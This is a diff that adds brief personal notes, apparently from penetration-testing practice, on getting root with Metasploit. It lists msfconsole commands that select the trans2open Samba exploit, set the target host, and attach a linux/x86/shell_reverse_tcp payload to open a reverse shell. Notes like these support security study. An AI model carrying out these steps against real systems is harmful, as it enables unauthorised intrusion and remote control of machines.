@@ -1,0 +1,39 @@
+========================================
+gaining root with metasploit framework or msfconsole
+========================================
+msfconsole really automates things as you're primarily using pre-made scripts to exploit vulnerabilities in systems
+========================================
+Commands
+========================================
+msfconsole
+
+> search trans2open
+
+> use 1 [[because it's a linux machine, not a bsd, macos or solaris based device
+
+> options
+
+> set rhosts X.X.X.X
+
+> options (display changes)
+
+> show targets
+
+type: > run !! > exploit
+
+looking for "sending stage"
+========================================
+> set payload linux/x86/
+
+(look for a non staged)
+
+> set payload linux/x86/shell_reverse_tcp
+
+> options
+
+> run
+
+Success
+
+
+========================================
